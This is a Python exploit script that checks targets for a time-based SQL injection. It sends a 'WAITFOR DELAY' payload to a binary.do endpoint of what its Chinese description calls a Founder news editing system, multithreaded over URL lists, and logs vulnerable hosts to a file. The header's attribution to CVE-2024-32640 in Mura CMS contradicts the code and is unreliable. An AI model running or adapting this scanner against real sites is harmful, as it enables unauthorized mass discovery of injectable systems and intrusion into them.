# CVE-2024-32640
# ""Mura CMS""

# https://fifeleisure.org/
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
.------..------..------..------..------.
|L.--. ||A.--. ||O.--. ||L.--. ||I.--. |
| :/\: || (\/) || :/\: || :/\: || (\/) |
| (__) || :\/: || :\/: || (__) || :\/: |
| '--'L|| '--'A|| '--'O|| '--'L|| '--'I|
`------'`------'`------'`------'`------'
"""
    print(test)

def main():
    banner() # banner
    # 处理命令行参数了
    parser = argparse.ArgumentParser(description="北大方正畅享全媒体新闻采编系统 binary.do SQL注入")
    # 添加两个参数
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    # 调用
    args = parser.parse_args()
    # 处理命令行参数了
    # 如果输入的是 url 而不是 文件 调用poc 不开多线程
    # 反之开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/newsedit/newsplan/task/binary.do'
    url = target+url_payload
    header = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data="TableName=DOM_IMAGE+where+REFID%3D-1+union+select+%271%27%3B+WAITFOR+DELAY+'0:0:5';select+DOM_IMAGE+from+IMG_LARGE_PATH&FieldName=IMG_LARGE_PATH&KeyName=REFID&KeyID=1"
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    res1 = requests.get(target,headers=header)
    if res1.status_code == 200:
        res2 = requests.post(url=url,headers=header,data=data,verify=False)
        res3 = requests.post(url=url,headers=header)
        time1 = res2.elapsed.total_seconds()
        time2 = res3.elapsed.total_seconds()
        # print(time1,time2)
        if time1 - time2 >= 5:
            print(f'该url{target}存在延时注入')
            with open('result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'该url{target}不存在延时注入')
    else:
        print(f'该网站{target}可能存在问题，请手工测试')
        

if __name__ == '__main__': # 主函数的入口
    main() # 入口 mian()